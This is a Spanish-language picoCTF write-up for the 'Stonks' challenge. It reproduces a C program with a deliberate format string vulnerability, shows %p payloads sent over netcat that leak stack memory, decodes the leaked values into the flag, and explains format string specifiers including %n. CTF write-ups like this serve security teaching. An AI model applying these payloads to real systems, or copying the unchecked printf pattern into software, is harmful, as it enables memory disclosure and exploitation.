# Stonks

## Descripción
Decidí intentar algo que nadie había hecho antes. He creado un bot que intercambia stonks automáticamente por mí usando IA y aprendizaje automático. ¡No te creería si me dijeras que no es seguro! [vuln.c](https://mercury.picoctf.net/static/17ba7f9351aca192c45833c658742fe5/vuln.c) `nc mercury.picoctf.net 27912`

## Pistas
- De acuerdo, tal vez te creería si encuentras mi clave API

## Solución
```bash
┌──(kali㉿kali)-[~/picoctf/b_exploitation/Stonks]
└─$ cat vuln.c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
        int shares;
        char symbol[MAX_SYM_LEN + 1];
        struct Stonks *next;
} Stonk;

typedef struct Portfolios {
        int money;
        Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
        if (!p) {
                return 1;
        }
        printf("\nPortfolio as of ");
        fflush(stdout);
        system("date"); // TODO: implement this in C
        fflush(stdout);

        printf("\n\n");
        Stonk *head = p->head;
        if (!head) {
                printf("You don't own any stonks!\n");
        }
        while (head) {
                printf("%d shares of %s\n", head->shares, head->symbol);
                head = head->next;
        }
        return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
        if (shares < 1) {
                return NULL;
        }
        Stonk *stonk = malloc(sizeof(Stonk));
        stonk->shares = shares;

        int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
        for (int i = 0; i <= MAX_SYM_LEN; i++) {
                if (i < AI_symbol_len) {
                        stonk->symbol[i] = 'A' + (rand() % 26);
                } else {
                        stonk->symbol[i] = '\0';
                }
        }

        stonk->next = NULL;

        return stonk;
}

int buy_stonks(Portfolio *p) {
        if (!p) {
                return 1;
        }
        char api_buf[FLAG_BUFFER];
        FILE *f = fopen("api","r");
        if (!f) {
                printf("Flag file not found. Contact an admin.\n");
                exit(1);
        }
        fgets(api_buf, FLAG_BUFFER, f);

        int money = p->money;
        int shares = 0;
        Stonk *temp = NULL;
        printf("Using patented AI algorithms to buy stonks\n");
        while (money > 0) {
                shares = (rand() % money) + 1;
                temp = pick_symbol_with_AI(shares);
                temp->next = p->head;
                p->head = temp;
                money -= shares;
        }
        printf("Stonks chosen\n");

        // TODO: Figure out how to read token from file, for now just ask

        char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);

        // TODO: Actually use key to interact with API

        view_portfolio(p);

        return 0;
}

Portfolio *initialize_portfolio() {
        Portfolio *p = malloc(sizeof(Portfolio));
        p->money = (rand() % 2018) + 1;
        p->head = NULL;
        return p;
}

void free_portfolio(Portfolio *p) {
        Stonk *current = p->head;
        Stonk *next = NULL;
        while (current) {
                next = current->next;
                free(current);
                current = next;
        }
        free(p);
}

int main(int argc, char *argv[])
{
        setbuf(stdout, NULL);
        srand(time(NULL));
        Portfolio *p = initialize_portfolio();
        if (!p) {
                printf("Memory failure\n");
                exit(1);
        }

        int resp = 0;

        printf("Welcome back to the trading app!\n\n");
        printf("What would you like to do?\n");
        printf("1) Buy some stonks!\n");
        printf("2) View my portfolio\n");
        scanf("%d", &resp);

        if (resp == 1) {
                buy_stonks(p);
        } else if (resp == 2) {
                view_portfolio(p);
        }

        free_portfolio(p);
        printf("Goodbye!\n");

        exit(0);
}
                                                                                                                
┌──(kali㉿kali)-[~/picoctf/b_exploitation/Stonks]
└─$ nc mercury.picoctf.net 27912
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p%p%p
Buying stonks with token:
0x89a33900x804b0000x80489c3
Portfolio as of Tue May 16 19:03:03 UTC 2023


1 shares of IMPN
11 shares of DZ
22 shares of SSI
8 shares of ZWI
44 shares of XNXT
Goodbye!
                                                                                                                
┌──(kali㉿kali)-[~/picoctf/b_exploitation/Stonks]
└─$ nc mercury.picoctf.net 27912
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Buying stonks with token:
0x9b163700x804b0000x80489c30xf7fb2d800xffffffff0x10x9b141600xf7fc01100xf7fb2dc7(nil)0x9b151800x80x9b163500x9b163700x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x326663310x306131300xffde007d0xf7fedaf80xf7fc04400x7275cc000x1(nil)0xf7e4fce90xf7fc10c00xf7fb25c00xf7fb20000xffde72780xf7e4068d0xf7fb25c00x8048eca0xffde7284(nil)0xf7fd4f090x804b0000xf7fb20000xf7fb2e200xffde72b80xf7fdad500xf7fb38900x7275cc000xf7fb20000x804b0000xffde72b80x8048c860x9b141600xffde72a40xffde72b80x8048be90xf7fb23fc(nil)0xffde736c0xffde73640x10x10x9b141600x7275cc000xffde72d0(nil)(nil)
Portfolio as of Tue May 16 19:03:25 UTC 2023


8 shares of ETJ
616 shares of N
113 shares of LX
1115 shares of JRCP
Goodbye!
```

>[!solution]
>Al analizar el código se concluye que el caso de la solución es muy parecido al reto anterior, por consecuencia se utilizaron distintos ataques de de formato de cadena, hasta que se consiguió el resultado al usar el `%p` que obtiene los valores de la pila de la computadora al momento de la ejecución del programa, se obtuvo varios caracteres en hexadecimal y al trabajar la cadena en "CyberChef", primero de hexadecimal a cadena de caracteres y despues con un Swap endianness,  se obtuvo la badera.

## Bandera
picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}

## Notas adicionales
>[!danger]
>**Format string attack**
>Se produce cuando los datos enviados de una cadena de entrada son evaluados como un comando por la aplicación. De este modo, el atacante podría ejecutar código, leer la pila o provocar un fallo de segmentación en la aplicación en ejecución, causando nuevos comportamientos que podrían comprometer la seguridad o la estabilidad del sistema.

**Parámetros comunes utilizados en el format string attack**
| Parametros | Salida | Pasado como |
|--------|--------|--------|
| \%% | % carácter (literal) | Referencia |
| %p | Representación externa de un puntero a void | Referencia |
| %d | Decimal | Valor |
| %c | Carácter |  |
| %u | Decimal sin signo | Valor |
| %x | Hexadecimal | Valor |
| %s | Cadena | Referencia |
| %n | Escribe el número de caracteres en un puntero | Referencia |

>[!info]
>**Swap endianness**
>Cambia los datos de big-endian a little-endian o viceversa. Los datos pueden leerse en hexadecimal o en bytes brutos. Se devolverán en el mismo formato en que se introduzcan.

## Referencias
[CyberChef](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')&input=NmY2MzY5NzA3YjQ2NTQ0MzZiMzQzMzRjNWY2NzZlMzE2NzM0NmM0NjY2NjYzMDVmMzQ3NDUzNWYzNjVmNmI2MzMwNjY2MjM0N2Q2NjY1Mzg)
[Format string attack](https://owasp.org/www-community/attacks/Format_string_attack)
[C Input Output (I/O)](https://www.programiz.com/c-programming/c-input-output)